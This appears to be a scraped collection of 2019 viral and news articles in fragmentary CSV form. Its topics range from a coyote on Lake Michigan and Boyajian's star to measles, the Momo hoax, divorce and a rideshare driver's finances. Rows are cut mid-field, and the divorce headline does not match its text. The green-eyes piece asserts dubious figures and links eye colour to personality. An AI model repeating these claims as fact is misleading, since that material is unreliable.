As the second-to-last frame of the diagram explains, you should be left with melty cheese, a moist crust, and a crispy bottom.",Reddit is Freaking Out Over this Genius Method for Reheating Pizza,

A drone captured this coyote maneuvering over an icy Lake Michigan on February 23.

A coyote trotting across an iced-over body of water isn’t something most people see every day, which makes a recent drone video capturing the occurrence on Lake Michigan all the more unique.

Keenan May, who grew up in Leelanau County, Michigan, and is currently spending time there with his wife Kristen on paternity leave, is the man behind the astonishing footage.

The video, which May's father Paul posted on his YouTube account, shows the drone slowly passing over an almost completely frozen Lake Michigan as the coyote, appearing at times as a tiny and dark moving line from up above, races across it.

May, 35, initially intended to bring his drone out to capture the incredible ice formations on the lake as the sun went down around 6:30 p.m. on Feb. 23, he told AccuWeather. “Sunsets have been far and few lately due to all the cloud cover!” he said.

It was around sunset that he spotted the coyote running atop the ice across the vast lake. The sight was surprising, May said, as he and his family rarely see coyotes out in the open.

“Having spent over 20 years in Leelanau and a lot of my time outdoors, I’ve only seen them a handful of times,” he said, noting that it’s also quite rare to see coyotes that exposed during the daylight hours.

“I’ve seen them on the beach at night before, but never before sundown,” he added. “It was absolutely the right time, right place.”

The coyote appeared to be trotting down the beach far out on the ice paddies looking for food – possibly shore birds, May told AccuWeather.

“He simply passed by us, and we watched him for several minutes,” May said. “He never stopped for more than a minute.”

While May only takes his drone out to film cool nature shots every couple of months when he finds a good opportunity, he said the coyote footage is “definitely up there” in terms of the most interesting subjects he’s captured.

“The Lake Michigan shoreline isn’t always this iced over, some years can see little to no ice,” he said. “This, matched with the coyote who is hundreds of yards offshore along the other edge of ice, is pretty amazing.”

Scientists Looked For Laser Signals From The ‘Alien
Megastructure' Star. This ls What They Found

",9/03/2019 14:55,https://www.iflscience.com/space/no-laser-signals-detected-from-mysterious-megastructure-star/,"Since its discovery three-and-a-half years ago, Boyajian’s star has fascinated professional astronomers as well as lay people alike. The star, also known as KIC 8462852, experienced unusual brightness fluctuations, which still remain without explanation.

Many naturally occurring phenomena have been proposed to solve the mystery – and, of course, some artificial ones. The star famously became known as the ""alien megastructure"" star, as some thought the changes in luminosity might be due to a large orbiting structure that could be used by an alien civilization to collect energy from the star.

Researchers have looked at this star time and time again, to see if they can spot any peculiar features that may aid them in the mystery. If there truly was a huge structure orbiting this star, how would the aliens transmit information and energy to and from it? The most likely answer is lasers, so researchers at the Breakthrough Listen Project have been looking for laser signals from the star. They didn’t find any.

The team analyzed 117 high-resolution spectra from Boyajian’s star using the Lick Observatory in California. Given the tech of the telescope and that the star is 1,470 light-years away, the team estimated that any laser more powerful than 24 megawatts would be detectable; powerful but not incredibly powerful (we developed megawatts lasers in the 1960s).

Nothing even close was seen by the team, led by David Lipman (then a high-school student, now at Princeton), who wrote an algorithm that sifts through the data. The top candidates in the study were either cosmic ray hits, regular stellar emission lines, or emission from our own atmosphere. The observations are reported in a paper available to read now on ArXiv, and it is published in the Proceedings of the Astronomical Society of the Pacific.

While the alien explanation has gone from the very unlikely to the extremely unlikely, the search for an answer goes on. Dr Tabetha Boyajian, lead author of the original discovery paper, continues to lead the community-funded efforts to study KIC 8462852. As posted on the project blog, the team has just restarted observations of the object in the hope of finally working out what’s going on. The main hypothesis is that the star is surrounded by a patchy donut of dust.

Boyajian’s star has gone through many names. It was also known as Tabby’s star after Dr Boyajian, though this is being phased out as objects named after people should be referred to by their surname. And at the very beginning, it was called the WTF star because the puzzled astronomers were very curious about “Where the Flux” of the star went as its brightness changed.

So, no lasers, and the mystery continues.

",8/03/2019 16:19,https://www.cnn.com/2019/03/07/health/measles-josh-nerius/index.html,"(CNN) Three years ago, Joshua Nerius, a 30-year-old software product manager in Chicago, developed a high fever and a rash. Doctors prescribed antibiotics, but Nerius just got sicker and sicker.

Joshua went to the emergency room, where a doctor said it looked a lot like the measles. Had he been vaccinated as a child?

Nerius texted the question to his mother. She sent back a thumbs-down emoji.

His next stop was an isolation room at Northwestern Memorial Hospital.

Nerius became so weak that at one point, he couldn't walk without assistance. He lost 25 pounds. It took months to fully recover.

""I felt horrible,"" he said. ""It took a serious toll.""

He thinks about the current measles outbreak, which started in Washington state, where dozens of children have suffered because their parents chose not to vaccinate them.

He knows that their suffering -- and his own three years ago -- could have been avoided.

""It makes me so angry. My parents thought they were doing the right thing. They were persuaded by the anti-vaxers,"" he said.

Measles kills

Nerius is something of a unicorn: a living adult who experienced measles recently and can describe what it feels like.

It's easy to forget how sick people get from measles or how it killed 400 to 500 people in the United States each year before the vaccine came into use in 1963, according to the US Centers for Disease Control and Prevention

""Measles is out of sight and out of mind, so we think it's no big deal, as Bill Shine's wife has said,"" said Dr. Paul Offit, director of the Vaccine Education Center at the Children's Hospital of Philadelphia.

Offit was referring to comments last month by Darla Shine, wife of the White House communications chief, who tweeted that she wished her children had had measles like she did as a girl.

""Bring back our #ChildhoodDiseases they keep you healthy,"" she wrote.

Offit, a professor of pediatrics at the Perelman School of Medicine at the University of Pennsylvania, thinks Shine might change her mind if she'd seen the children he cared for in 1991 during a measles outbreak in Philadelphia.

""They were absolutely miserable,"" he remembers. ""And occasionally, they were dead.""

Nine children died in that outbreak, according to the Philadelphia Department of Public Health.

Offit can't understand why Shine and other anti-vaxers would prefer dead children over vaccinated children.

""When Darla Shine talks about how great it was that she had measles as a child, what she forgets to mention is that she gets to tell her story because she's alive. The ones who died -- we don't hear from them,"" he said.

Josh Nerius contracted measles in May 2016 at a graduation ceremony.

A near miss

Nerius remembers the scariest part of his bout with measles.

He contracted the disease in May 2016, at his sister's graduation from that Northern Illinois University College of Business. The Illinois Department of Health later determined that a guest who had traveled to the graduation from outside the United States had the measles, which is highly contagious.

""I didn't interact with anyone at that graduation besides my own family, so it was literally just me walking by someone,"" he said.

He says the scariest part is that the day after his sister's graduation, before he knew that he'd been infected, he attended a technology convention in Las Vegas with thousands of other people.

Get CNN Health's weekly newsletter Sign up here to get The Results Are In with Dr. Sanjay Gupta every Tuesday from the CNN Health team.

""I was shaking hands with hundreds of people a day. I wasn't contagious yet, but it's sobering to think if the timing had been just slightly different, how many people I could have infected,"" he said.

Nerius doesn't blame his parents for not vaccinating him. He says they were believers in alternative medicine, and in the 1980s, there was no Internet where they could double-check what they were being told by anti-vaxers.

But today's parents have no excuse, he says. They can go to the American Academy of Pediatrics or a multitude of other sites to learn that vaccines are safe and keep children healthy.

""The science on this has been settled. It's been solved. When I look at where we are today, with people who are willfully deciding to ignore the facts, it really frustrates me,"" Nerius said. ""I just don't understand the mindset of people who want to spread fear.""","Anti-vaxers' adult son gets measles; now, he has this message for the world",

The Grocery Store with the Worst Reputation in America

",8/03/2019 14:17,https://www.rd.com/article/grocery-store-worst-repuation-america/,"Grocery stores are more dividing than you think. Here's what people love and hate about your favorite stores—and which one is the worst of all.

Jeff Chiu/AP/REX/Shutterstock

Not all grocery stores are created equal. And according to a recent survey from Consumer Reports, more than 50,000 food shoppers have some serious complaints about specific stores.

Surveyors complained mostly about grocery stores with too few checkout lanes and long lines, congested aisles, too few food choices, and a poor selection of local products. Some of the worst offenders include Target, Aldi, and Stop and Shop. But the worst of the worst, according to survey results, is Walmart.

The discount chain store undoubtedly has competitive pricing. In fact, that’s the one category where Walmart was highly ranked. The low overall ranking, however, stems from low rankings in seven out of 12 possible categories. This includes cleanliness, staff courtesy, checkout speed, produce and meat quality, and local produce selection. That’s a far cry from the grocery store with the best reputation.

The superstore also came in last in the supermarket category in the most recent report by the American Customer Satisfaction Index. Again, customers were dissatisfied with the slow checkout speed and unfriendliness of the staff. The stores taking the top spots on ACSI’s report were Trader Joe’s and Wegmans—these stores also show up consistently as being highly rated grocery stores in the United States for overall value, too.



Walmart has also faced criticism in the past for its poor relationship with workers. Business Insider reports that the company even spent more than $18 million on ads in 2017 to highlight recent investments and changes in company policy.

On the bright side, some popular stores did rank well. Fareway Stores, Wegmans, and Publix are amongst the top. Only about 23 to 30 percent of surveyors had a complaint about them—making them the least complained about in the ratings. Can’t find one of these stores near you? Don’t fret, because there’s a best supermarket in every state.",The Grocery Store with the Worst Reputation in America,

Submarine Team Discover What's At Bottom Of Belize’s Great
Blue Hole ‘Where Light Doesn't Reach’

",4/03/2019 19:57,https://www.unilad.co.uk/science/submarine-team-discover-whats-at-bottom-of-belizes-great-blue-hole-where-light-doesnt-reach,"A submarine team delved into the mysterious depths of Belize’s Great Blue Hole to discover what’s lying hidden in the areas light doesn’t reach.

Scientists recently set out to search the gaping sinkhole, which is a UNESCO World Heritage site and measures 300 meters (984 feet) in width, and reaches a depth of 124 meters (407 feet).

Advert 10

Earlier this year, the team shone a light into the hole to discover what lay beneath, and they were met with a saddening scene when they found plastic littering the site.

But there were depths the light couldn’t reach, and so the researchers had to try a different method to figure out what the ocean was concealing.

In a blog post, Erika Bergman, oceanographer and the chief submarine pilot on the expedition, explained by using sonar, the team were able to produce a three-dimensional image of the sinkhole.

Advert 10

They focused on certain points of interest, including stalactite caverns formed when sea levels were lower, and the hole was a dry cave, which have now been encrusted by marine growth.

At 290 feet deep the team found a calcium carbonate layer where a coral reef used to grow, and at 407 feet they found evidence of some small stalactite and stalagmite formations, which had been covered in sand over time.

Data found below a hydrogen sulfide layer at 300 feet, the hole is completely anoxic, meaning there’s not a single drop of oxygen in the water.

Advert 10

The lack of oxygen was also evidenced by a ‘conch graveyard’, which Bergman described as ‘a stretch of the blue hole where we observed hundreds of dead conch that had presumably fallen in to the hole’.

She added:

We can see each conch with little tracks back up the hill trying to escape, then a slide mark where it slid back down after presumably being asphyxiated in the anoxic environment.

Advert 10

It doesn’t sound like a pleasant end for the poor conch.

Bergman called the hole ‘otherwordly’, and it certainly sounds it!

A creepy conch graveyard isn’t quite what springs to mind when you picture the luxurious Caribbean sea.

Only Two Percent of the World's Population Have This Trait

But of the more than seven billion people on the planet, only 2 percent can claim to have this one special trait. (To put that in perspective, that’s 140 million people).

So what’s this rare trait only one in fifty of us possess? Green eyes. That’s right, just 2 percent of the world’s population is lucky enough to have ’em, according to World Atlas.

Compare that to other eye colors. For example, some 79 percent of the population has brown eyes, while 8 percent has blue. About 5 percent of people have hazel eyes and another 5 percent have amber eyes. Simply put, green eyes are incredibly unique. (Unique enough, in fact, to give Chris Martin the inspiration that would make Coldplay an overnight success).

Green eyes are most common in Central, Western, and Northern Europe, and typically point to Celtic or German ancestry. At the moment, they’re most prevalent in Britain, Iceland, the Netherlands, Scotland, Estonia, and Scandinavia. In fact, according to a study conducted by ScotlandsDNA, in Britain, brown eyes are rarer than green. There, 22 percent of the population has brown eyes, compared to the jaw-dropping 30 percent that has green.

To get green eyes, the irises need a unique blend of “light brown pigmentation, yellowish lipochrome pigment, and a splash of Rayleigh scattering,” according to Eyesite Opticians. And interestingly enough, it can take up to three years for green eyes to appear in small children, as the Rayleigh scattering takes time to form and appear in humans.

Despite green eyes being such a rarity, numerous characters in literature and film have them, perhaps to convey a sense of mystery. In fact, many researchers believe that eye color is a true indicator of personality. For example, researchers from the University of Queensland and the University of New South Wales found that they tended to be less agreeable, more competitive, creative, devious, and shy.

This Is Why Billy Porter Wore a Gown Instead of a Tux to the
Oscars
",3/03/2019 13:37,https://twentytwowords.com/billy-porter-wore-gown-instead-tux-oscars/,"Billy Porter, star of hit television show Pose, subverted expectations by wearing a tuxedo gown on the Oscars red carpet tonight. The custom gown was designed by Christian Siriano and was actually a two-piece outfit made up of a strapless gown with a tuxedo jacket over top.

The outfit felt like a fun wink to the gender-normative tuxedos worn by every other man on the carpet, but according to Porter, there was a deeper, more poignant reason he chose to wear it.

He chose to say something with his clothing choice. via Getty Images Porter told Vogue, “I’ve always been inspired by fashion. My grandmother, my mom—they were always stylish. I grew up loving fashion, but there was a limit to the ways in which I could express myself. When you’re black and you’re gay, one’s masculinity is in question. I dealt with a lot of homophobia in relation to my clothing choices. [Even] when I had my first working contract at A&M Records, I was silent for a long time. I was trying to fit in to what other people felt I should look like. When I landed a role in Kinky Boots, the experience really grounded me in a way that was so unexpected. Putting on those heels made me feel the most masculine I’ve ever felt in my life. It was empowering to let that part of myself free.”

And we are absolutely blown away. via Getty Images He continued with, “Now I’m in a space where, being on Pose, I’m invited to red carpets and I have something to say through clothes. My goal is to be a walking piece of political art every time I show up. To challenge expectations. What is masculinity? What does that mean?”

The Truth About The 'Momo Suicide Challenge’ Is Actually More

Disturbing Than You Think
",1/03/2019 11:51,https://www.iflscience.com/editors-blog/the-truth-about-the-momo-suicide-challenge-is-actually-more-disturbing-than-you-think/,"Embedded in children's videos are “surprise eggs” spliced in by unknown hackers featuring a wide-mouthed figurine with hauntingly large eyes taunting in a child-like voice, “ Momo, Momo, Momo is going to kill us .” Facebook/Police Service of Northern Ireland

A creepy doll-like figure is at the center of a disturbing new twist to viral challenges reportedly responsible for sending graphic violent images and daring children to inflict self-harm and intentionally kill themselves. Fair warning: This article contains some disturbing content and may be distressing to children.

The “Momo Challenge” joins the ranks of recent viral challenges hyped by the media. The cyberbullying attempt targets young children watching seemingly innocent videos on YouTube Kids and other platforms. Embedded in these videos posted by unknown hackers are “surprise eggs” featuring a wide-mouthed figurine with hauntingly large eyes taunting in a child-like voice, “Momo, Momo, Momo is going to kill us.” In videos seen by IFLScience, they prompt viewers to call or text a number displayed on the screen. Various reports allege that contact with this number would be followed by dares to inflict self-harm or take one’s life. According to the UK’s National Online Safety (NOS) organization, the Momo Challenge has been around for some time and is once again resurfacing with links to apps like Facebook, WhatsApp, YouTube, and YouTube Kids.

“In all the hysteria, multiple claims of ‘hacked’ Peppa Pig videos have run rampant, but in all cases, the only thing that exists are warnings about said videos, rather than the videos themselves. This itself is some sort of collective meme recollection from 2017, where pranksters spliced genuine footage of children's cartoons with horrible inserts – entirely unrelated to Momo. It seems people are tying it up into older unrelated YouTube antics. It is doubtful that any hacking of YouTube videos to insert this redundant meme into them is taking place and based on what I've seen so far anyone under the age of 15 has rolled their eyes at Momo's return from its Creepypasta grave,” Chris Boyd, senior threat researcher at Malwarebytes, told IFLScience.

-

It Is Just An Urban Legend

Just like Creepypasta, Momo is made to look like an urban legend or viral challenge and uses the media to say as much, perpetuating its supposed legitimacy. Concerns about child safety have prompted thousands of users to share warnings, but danger lies in repeating rumors without solid evidence.

“These stories being highly publicized and starting a panic means vulnerable people get to know about it and that creates a risk,” a spokesperson with Samaritans told The Guardian. Others continue that media outlets should read their guidelines on reporting suicide.

-

Momo May Be A Front For Hacking

Officials say it's more than just about scaring kids – the “sinister” suicide game covers up hackers trying to steal information, reports the BBC in a recent article.

“This extremely disturbing challenge conceals itself within other harmless-looking games or videos played by children and when downloaded, it asks the user to communicate with 'Momo' via popular messaging applications such as WhatsApp. It is at this point that children are threatened that they will be cursed or their family will be hurt if they do not self-harm,"" said Police Service of Northern Ireland in a statement. Parents should take care to educate their children about online safety, particularly discouraging them from contacting strangers or sharing personal information.

YouTube Says They Have Seen No Evidence Of Momo

An average of 300 hours of content is uploaded to YouTube every minute, which presents a challenge for moderators to catch all inappropriate content. When a viewer sees a Momo-related video, an investigation conducted by NOS found that “countless other Momo themed videos and other scary content” not appropriate for children is cued in the platforms Up Next feature.

""We want to clear something up regarding the Momo Challenge: We’ve seen no recent evidence of videos promoting the Momo Challenge on YouTube. Videos encouraging harmful and dangerous challenges are against our policies,"" said YouTube in a Tweet.

No Deaths Have Been Linked To The Momo Challenge

Momo made its first appearance in the news cycle last year after reports of a 12-year-old girl had reportedly killed herself after having been motivated by the viral challenge. Similarly, Indian media reported two deaths by suicide of people allegedly participating in the challenge. However, official documentation is lacking in both instances, and UK-based digital safety organization Parent Zone writes that there is little evidence of any deaths directly tied to Momo.

Most Importantly, Do Your Research And Talk With Your Children

The Ohio Department of Education says the Momo Challenge can be a teachable moment for parents to have positive conversations with their children and to monitor their online usage.

Suicide is the third leading cause of death among youth and young adults age 10 to 24, according to the Centers for Disease Control and Prevention. NOS advises parents to remind their children that Momo is not real (after all, the figurine was just a Japanese prop named “Mother Bird” displayed in an art exhibit three years ago) and that it cannot hurt them or control their behavior. Parents can also set up parental controls, such as turning off YouTube’s suggested auto-play feature and reporting harmful content that goes against YouTube's Community Guidelines.","The Truth About The ""Momo Suicide Challenge"" Is Actually More Disturbing Than You Think",

The Biggest Sign of Divorce Men Never See Coming
",28/02/2019 17:40,https://www.yahoo.com/lifestyle/biggest-sign-divorce-men-never-221140305.html,"No one walks down the aisle with the intention of splitting up later. But, unfortunately, approximately 50 percent of marriages in the U.S. end in divorce. And if you do find yourself sitting across from your former spouse with lawyers by your sides, it's important to remember it's not the end of the world. After all, while divorce will inevitably shake up your life in many ways, it will also free you from the negativity of an unhealthy marriage. For help shifting your outlook, read on to learn the major upsides of divorce no one expects. And for more on divorce, check out the 25 Secrets Your Divorce Lawyer Won't Tell You. 1\. Your mental and physical health improves.While you’ve probably heard about the health benefits of happy marriages, divorce can have some, too—especially if your relationship was rocky or unstable. One long-term study conducted by researchers at the University of Nevada and the University of Michigan found that marital conflict leads to damaging responses in the body, such as inflammation, changes in appetite, and increased release of stress hormones, all of which can affect numerous aspects of your health.“Conflict can be particularly damaging for health if spouses are hostile or defensive during disagreements or if they are arguing about the same topic over and over again without any resolution,” says Rosie Shrout, who presented the study's results at the International Association for Relationship Research conference in 2018. Resolving your conflicts with a separation or divorce can lower your stress levels and improve your health. 2\. You might develop better financial habits.Although divorce is often painted as disastrous for financial wellness, it could actually push you toward a paradigm shift in how you think about money. During a divorce, both partners must take a deeper look at their financial realities, which can help you craft a better budget and stick with it. “Divorce forces people to have a budget, and if they stick with that budget they can actually get in a better place financially,” says certified divorce financial analyst Nicole N. Middendorf, a wealth advisor and the CEO of Prosperwell. 3\. You’ll develop increased patience.Patience might be a virtue, but it’s often one in short supply, especially in the throes of a contentious marriage. A painful experience like divorce can present an opportunity to cultivate stronger coping skills as you learn to move passed the grief and other challenges divorce presents.“Remember that everything you're going through is temporary,” urges Jennifer Giamo, founder of Fresh Start Fitness, which helps women heal and thrive after divorce. “What may feel like the end of the world at the moment will change and shift over time and it will get better. Being patient—however difficult—is part of the process that will lead to a more peaceful place.” 4\. You’ll have more adventures.Instead of miring yourself in the everyday difficulties of marital conflict like you may have been doing, think of the post-divorce world as your oyster.Divorce and family lawyer Randall Kessler of Kessler&Solomiany, LLC says that after a marital separation, “You can pursue passions your ex didn’t have, like travel, sports, art, or hundreds of others.” With time, you can think differently not only about your divorce but about your entire future. 5\. You'll be a better parent.Many married couples with children worry that a separation will negatively affect their kids. But divorce attorney Lisa Marie Bustos, of Bustos Family Law, PLLC in Austin, Texas, explains that it’s often the opposite. “One of the more unexpected benefits that I've seen with divorce clients is that the quality of their parenting improves,” she explains.“Often times, parents are splitting time with their children. Dad may have the kids on Monday and Tuesday, and Mom may have the kids on Wednesday and Thursday. Instead of running the daily rat race of being the ‘everything to everyone’ type of parent, a parent who splits custody can actually focus on their children when they have visitation with them.” 6\. Your kids will have stronger relationships later in life.One University of Central Florida study on college students from both divorced and intact families found that those whose parents were divorced often had more successful relationships than those whose parents were together.And David Mahl, another researcher on children of divorce, concluded that “divorce can strengthen kids’ ability to sustain successful relationships, but only if their parents stay supportive throughout the ordeal.” 7\. You’ll get better sleep.With the stress of a bad marriage off your shoulders and some new space in your bed, you might be able to get a little more shut eye after a divorce. One study published in the journal Psychiatry Research found that among individuals whose divorces had been finalized, the amount of time they spent in delta-wave sleep (which is ideal quality sleep) had improved. 8\. You can become a mindfulness whiz.Being aware in the moment is key to navigating any stressful circumstance, from a tricky situation at the office to a divorce. Giamo says that meditation, yoga, and other mindfulness practices can help you work through your divorce—and might even become a whole new wellness routine.“I found meditation and yoga to be super helpful when I was going through my divorce,” she says. “It really helped to calm me down and stop my mind from racing. The breathing techniques also come in really handy when you feel yourself getting frustrated.” 9\. You could find your new favorite hobby.Remember all those things your ex didn’t want to try with you? The RV you wanted to buy for a cross-country road trip? The salsa dancing classes you never had time to take? Well, in the wake of a divorce, try to think of life as a smorgasbord of opportunities, ready for you to try one by one.“Focus on building your life,” says Tina B. Tessina, Ph.D., psychotherapist and author of Dr. Romance’s Guide to Finding Love Today. According to Tessina, the aftermath of divorce is ""a great time to try something other than a relationship: take a class, start a new business or career, get a puppy."" Just go for it! 10\. You'll finally get in shape.An unhappy marriage is a major stressor that often stops people from getting fit, especially if they’ve adopted unhealthy eating and exercise habits with their spouse.Whether you think of your path to fitness as a “revenge body” or just a positive transformation, a divorce can serve as a great motivation to get moving and get fit. “The most important thing to remember when going through a divorce is to maintain your health and wellbeing,” Giamo says. “It can be the most stressful time in your life, and if you don't manage it properly with good nutrition and exercise (which is sometimes the last thing you feel like doing), it can feel even more overwhelming.” 11\. You’ll have more satisfying sex.While there hasn't been much formal research on the subject of sexual satisfaction after divorce, researchers do know that sex in general peaks around the age most people experience a split. According to one study published by Women in the World, women don't hit their sexual stride until after their 36th birthday. And most people who get divorced are in their mid-to-late 40s, according to Jonathan Fields, a divorce litigator. See how that works out?Divorce can also be a chance to reassess what you really like and dislike intimately and what you want to look for in a new relationship. “Divorced people find it much easier to get back in the saddle so to speak,"" Dr. Andy Trees, author of A Scientific Guide to Successful Dating, told CNN. ""Sex with someone new is always exciting in a way that sex with a familiar partner isn't (which isn't to say that long-term sexual intimacy doesn't have pluses as well).” 12\. You can get some extra cash flow.If you need a little extra cash flow, a divorce can sometimes give you an unexpected boost. With a qualified domestic relations order in place as part of your divorce agreement, you can withdraw money from your retirement account—without having to pay that nasty IRA early withdrawal penalty. And while it's definitely not the best idea to dip into that retirement account, it's nice to know the option is available if you truly fall on hard times after a split. 13\. You’ll find out who your real friends are.Many of the benefits of divorce have to do with starting fresh—and that includes learning who your real friends are, who you can trust, and who really has your back through thick and thin.""You don’t need to talk anyone into staying friends with you,"" explains Babble's Katie Bingham-Smith. ""Instead, your life shifts in order to bring the right people around you—and before you know it, you will find the support you need."" 14\. You’ll find yourself.When you go through something as difficult as a divorce, it can be a chance to take a long, hard look at yourself, and come to know yourself (the good, the bad, and everything in between) in a whole new way.“I discovered who I really was after my divorce,"" says licensed clinical social worker Beatty Cohan. ""It may never have happened had I stayed married.” 15\. You can break your old patterns.Toxic or difficult relationships often push us to develop bad habits, like unhealthy eating, excessive drinking or spending, or sedentary lifestyles. In addition to taking on new adventures or hobbies, try a little habit-pruning after your divorce. Use journaling techniques or head to therapy to try to root out some of the negative patterns in your life. 16\. You might even find peace…even with your ex.""Peaceful"" might not be the word that comes to mind when you think of divorce. But finding closure after a divorce can actually help you gain a sense of peace and perhaps a friendship with your ex, even if that seems impossible at first, says licensed social worker Daniel S. Sokal. “Divorce can lead a couple that was locked into long-term repetitive relational conflict loops to a more civil and peaceful coexistence,” he explains. 17\. Your next relationship is likely to be much better.Even a bad marriage can prepare you for a better one. Without all the baggage of your old relationship weighing you down, you can take on a whole new approach to dating and prepare for a healthier love in the future. In fact, “second marriages are often happier,"" says Tessina.And one study published in the Journal of Happiness Studies confirmed that. ""Previously married individuals experience a stronger increase in both happiness and satisfaction when entering a new partnership than never-married individuals,"" wrote Morten Blekesaune of Agder University in Norway, who led the study. ""One possible explanation is that previously married individuals have … different expectations than never-married individuals.""

Before ridesharing took off in New York City, he drove school buses for seven years. He also drove for taxi service companies, which is how many New Yorkers got from point A to point B before Uber arrived in May 2011. What's it really like to drive full-time in one of the busiest cities in America? I spent a day on the road with Castillo to find out.

The hours

Castillo typically works six days a week, Monday through Saturday. On weekdays, he starts driving between 6 and 7 a.m. and finishes up between 4 and 5 p.m. That's nine to 11 hours a day. On Saturday, he starts his day a little later, between 8 and 9 a.m. On this particular morning, a Wednesday, he was ""feeling sleepy,"" he tells me, and left his home in Brooklyn at 7 a.m. First, though, he grabbed breakfast at Dunkin' Donuts. The flexibility that comes with being your own boss makes up for the long hours, says Castillo. The father of three schedules his day so that he can be home in time to pick his kids up from school, help with homework and have a family dinner. Castillo with his family

The earnings

On a typical day, Castillo brings home $250. If he works Monday to Saturday, that's $1,500 per week, which comes out to about $6,000 a month. He earns an additional $100 to $300 per month by using Cargo, which pays him a monthly rate for selling products like snacks and headphones to passengers, and Play Octopus, which pays him to mount a tablet that offers trivia games and plays ads. That means, theoretically, he's earning $72,000 a year from rides and between $1,200 and $3,600 a year from Cargo and Play Octopus, for a total of about $75,000 before taxes. Castillo gets paid per ride and his earnings depend on how long the trip is, how much distance he covers and whether or not there's ""surge pricing,"" which is when demand for rides is high and prices for passengers goes up. Surge pricing, or ""prime time,"" as Lyft calls it, tends to happen during rush hour, bad weather or if there's a big event going on in the area. Castillo and I check in on his earnings periodically. A mid-morning, 22-minute UberX trip earns him nearly $10. The app doesn't show how much the customer paid — it just breaks down Castillo's take: He earns a base rate (what you're paid to start the ride) of $1.83, a time rate (what you earn per minute in your region) of $5.49, and a distance rate (what you earn per mile in your region) of $2. Total: $9.32.

Uber and Lyft both collect about 30 percent of all passenger fares, Castillo tells me. Juno takes just 16 percent, but it's not as popular an app yet, he adds. Sure enough, we don't get one call from Juno over the course of the day and, instead, flip back and forth between Uber and Lyft. He has all three because, depending on what neighborhood he's driving in, one app may be busier than the others. ""People in Bed Stuy [Brooklyn] like to use Lyft,"" he says. ""If you're in Queens, people like Juno."" The more rides he completes, the more he gets paid, so ""you want to be busy all the time,"" he tells me. ""Our time is money.""

That's why Castillo rarely takes breaks throughout the day. We don't make our first pit stop until 2 p.m., when Castillo runs into his mother-in-law's apartment to use the bathroom. He does this once or twice a day, he tells me. Besides that, we pull over once more to stretch our legs. Castillo doesn't stop for a meal or eat during his entire shift. That's not entirely normal, though: He usually packs a lunch from home that he'll eat in his car, but today's breakfast, he assures me, was filling. After about nine hours on the road — 7 a.m. to 4 p.m. — Castillo makes $233 across 15 rides. Nine rides and $140 come from Lyft, while six rides and $93 come from Uber. ""That's a good day,"" he tells me, especially considering he took more breaks than usual to accommodate my filming. On his best day, Castillo took home $540 after nine hours of driving, thanks to surge pricing. One-fifth of that came from a single, lucrative trip to the airport, he says: ""It was snowing and it was ugly outside. It was like 5:30 or 6 p.m., peak hours. They paid me like $110.""

The expenses

While Castillo can earn about $6,000 per month, the expenses that come with the gig add up. For starters, he needs a car. He drove a Nissan Pathfinder up until a couple of months ago, when he upgraded to a 2017 Honda Pilot. He bought it nearly brand new — it had just 25 miles on it — for about $40,000, he says. The vehicle was a worthwhile investment, Castillo tells me, because it can fit more passengers, which means he can pick up bigger groups and earn more money. Plus, it comes with features like automatic braking, a back-up camera and a sunroof. ""We go everywhere, so your car's gotta be 100 percent,"" he says.

Here's a breakdown of the other expenses he has to factor in: TLC driver license: $252 to renew every three years ($84 per year) To pick up riders in New York City, Castillo needs a special license called a TLC driver license, which costs $252 to renew every three years. TLC vehicle renewal: $625 every other year ($312.50 per year) Every other year, Castillo has to renew his car and bring it in for a thorough inspection. This costs $625: $550 for the renewal fee and $75 for the inspection fee. Regular inspections: $37 every four months ($111 per year) As a rideshare driver in New York state, Castillo also has to do more regular inspections — every four months — at the DMV. These cost $37 each. NYC commercial motor vehicle tax: $400 per year (to DMV) Vehicle registration: $456 per year

Insurance: $400 per month ($4,800 per year) The cost of insurance depends on your driving record and can vary anywhere from $400 to $800 per month, Castillo estimates, though he pays closer to $400 a month. Gas: $675 per month ($8,100 per year) Gas also varies per driver and depends on your car model, how much you drive and where you're driving. Castillo says he fills up his tank every other day for $45. That's about $675 per month. Maintenance: About $2,500 per year This includes oil changes, tire repairs and brake repairs. Castillo has to change his oil every four to five weeks, which costs $70 each time. His brakes are inspected every three months, which costs about $220 each time. As for tires, they get checked out every three months. It costs about $100 to repair each tire, but not every tire has to be repaired every time, he says. Other Drivers are required to do a drug test every year and take courses in things like defensive driving and wheelchair passenger assistance, which they pay for out of pocket. Plus, Castillo buys cleaning products — he wipes down his leather seats every day — and gets the exterior of his car cleaned every few days. Unexpected costs like traffic and parking tickets can also arise. In total, that's about $17,000 of expenses to account for each year. Plus, he owes taxes on his earnings. Like any freelancer, he fills out a 1099 tax form every year to report his income.

The best part of the job

Besides the flexibility that comes with being your own boss, Castillo loves the social aspect of the job. On this particular day, we complete 15 rides and pick up about 30 passengers from all walks of life: a mother and daughter visiting from North Carolina, a caterer delivering lunch in midtown Manhattan and co-workers from a Brooklyn-based start-up that makes dog food. Castillo talks to everyone. ""I like to meet people,"" he tells me. ""I like to talk to people of different backgrounds.""

I like to meet people. I like to talk to people of different backgrounds. Al Castillo full-time rideshare driver

The hardest part of the job

The passengers can also be the toughest part of his job, though — dealing with the ones with attitude, that is. The best way to handle unhappy passengers is to simply stay calm, he tells me, and to remember that ""you only gotta be with them in the car for 10, 20 minutes."" After that, you never have to see them again. Driving in New York City is no easy task, either, he adds, especially in Manhattan: ""You gotta be aware of the yellow cabs, bikes, people. When the light is green, people are crossing the street so we always gotta be looking at our mirror every second. You always gotta be aware.""

What it takes to be a great rideshare driver

If you want to stand out, you need three things, Castillo tells me. 1. A phone charger for passengers. After all, ""everybody always need a charger,"" he says. 2. Patience. ""If you don't have patience to drive and to meet people and deal with people, don't do it,"" says Castillo. ""Because patience is the most important thing. You're not only driving — you're dealing with traffic, you're dealing with bikes, you're dealing with the customer."" 3. A good vibe. ""Vibe is everything,"" Castillo tells me, and it's important to read your passengers, too. If they're on a phone call, for example, turn the music down.

Show Caption Hide Caption The world's going to end eventually, but not like this! Many 'doomsday' predictions have surfaced over the years. Here's a look at four of the most notable ones. USA TODAY

David Meade, who claimed the world will end Saturday, said doomsday isn't this weekend after all.

“The world is not ending, but the world as we know it is ending,” he told The Washington Post. “A major part of the world will not be the same the beginning of October.”

Meade, Christian and self-published author, laid out his ""astronomical, scientific, the Book of Revelation and geopolitics"" ideology in his book Planet X — The 2017 Arrival. He claims Sept. 23 ""Planet Nibiru"" will collide with the Earth.

But now Meade is saying this event won't mark the apocalypse, but rather a series of dire events over the course of weeks, The Washington Post reports.

